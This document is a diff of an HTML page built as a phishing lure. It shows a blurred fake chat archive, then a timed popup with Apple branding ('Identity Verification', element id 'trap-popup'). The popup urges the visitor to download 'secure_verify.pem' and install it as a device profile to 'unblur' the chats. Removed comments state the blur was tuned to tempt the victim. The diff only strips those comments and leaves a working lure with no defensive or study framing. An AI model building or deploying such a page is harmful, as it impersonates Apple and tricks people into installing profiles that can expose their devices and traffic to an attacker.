@@ -5,67 +5,47 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #000; overflow: hidden; }
-        
-        /* Chat Background - Kam Blur taaki usey naam clear dikhe */
         .chat-background {
             background-image: url('chat_preview.jpg'); 
             height: 100vh; width: 100%;
-            filter: blur(6px); /* Blur bahut kam kiya hai taaki woh padhne ki koshish kare */
+            filter: blur(6px);
             background-position: center; background-repeat: no-repeat; background-size: cover;
             position: fixed; top: 0; left: 0; z-index: 1;
-            transition: 0.5s; /* Smooth Transition */
+            transition: 0.5s;
         }
-
-        /* Verification Card - Yeh pehle chhupa rahega */
         .verification-box {
             position: relative; z-index: 3;
             background: rgba(255, 255, 255, 1); padding: 30px; border-radius: 22px;
-            text-align: center; max-width: 320px; margin: 15vh auto;
+            text-align: center; max-width: 310px; margin: 15vh auto;
             box-shadow: 0 15px 40px rgba(0,0,0,0.7);
-            display: none; /* Pehle chhupa rahega */
-            animation: fadeIn 0.8s ease-out; /* Pop-up animation */
+            display: none;
+            animation: fadeIn 0.8s ease-out;
         }
-
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
-
         .apple-logo { width: 35px; margin-bottom: 15px; }
         h2 { font-size: 19px; color: #1d1d1f; margin-bottom: 10px; font-weight: 600; }
         p { font-size: 13px; color: #48484a; margin-bottom: 25px; line-height: 1.5; }
-        
         .btn {
             display: block; background: #007aff; color: white; text-decoration: none;
             padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px;
         }
-
         .info-text { margin-top: 18px; font-size: 12px; color: #8e8e93; font-weight: 500;}
     </style>
 </head>
 <body>
-
     <div class="chat-background"></div>
-
     <div class="verification-box" id="trap-popup">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
         <h2>Identity Verification</h2>
         <p>Decrypted chat history detected. To view the full archive and unblur the content, complete a one-time verification certificate.</p>
-        
         <a href="secure_verify.pem" class="btn">Unblur & Read Chats</a>
-
-        <div class="info-text">
-            Required Step: Allow > Settings > Profile > Install
-        </div>
+        <div class="info-text">Required: Allow > Settings > Profile > Install</div>
     </div>
-
     <script>
-        // 5 second baad pop-up aayega
         setTimeout(function() {
-            // Pop-up ko dikhana
             document.getElementById('trap-popup').style.display = 'block';
-            
-            // Background ko thoda aur blur kar dena taaki card clear dikhe
             document.querySelector('.chat-background').style.filter = 'blur(15px)';
-        }, 5000); // 5000 milliseconds = 5 seconds
+        }, 5000);
     </script>
-
 </body>
 </html>
